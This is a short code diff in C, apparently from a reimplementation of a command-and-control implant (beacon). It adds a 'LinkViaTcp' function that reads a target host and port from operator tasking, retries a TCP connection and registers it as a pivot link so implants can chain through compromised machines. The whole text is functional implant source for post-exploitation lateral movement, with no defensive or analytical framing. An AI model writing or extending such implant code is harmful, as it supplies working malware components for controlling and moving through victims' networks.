@@ -95,3 +95,36 @@ SOCKET LinkViaTcpConnect(char* target, short port)
 
 	return sock;
 }
+
+#define PIVOT_HINT_REVERSE 0x10000
+#define PIVOT_HINT_FORWARD 0
+#define PIVOT_HINT_PROTO_PIPE 0
+#define PIVOT_HINT_PROTO_TCP 0x100000
+
+void LinkViaTcp(char* data, int length)
+{
+	int timeout = GetTickCount() + 15000;
+
+	datap parser;
+	BeaconDataParse(&parser, data, length);
+	short port = BeaconDataShort(&parser);
+	char* target = BeaconDataBuffer(&parser);
+	NetworkInit();
+
+	while(GetTickCount() < timeout)
+	{
+		SOCKET sock = LinkViaTcpConnect(target, port);
+		if (sock != INVALID_SOCKET)
+		{
+			PROTOCOL protocol;
+			ProtocolTcpInit(&protocol, sock);
+			LinkAdd(&protocol, port | PIVOT_HINT_PROTO_TCP);
+			return;
+		}
+
+		Sleep(1000);
+	}
+
+	DWORD error = WSAGetLastError();
+	BeaconErrorD(ERROR_CONNECT_TO_TARGET_FAILED, error);	
+}
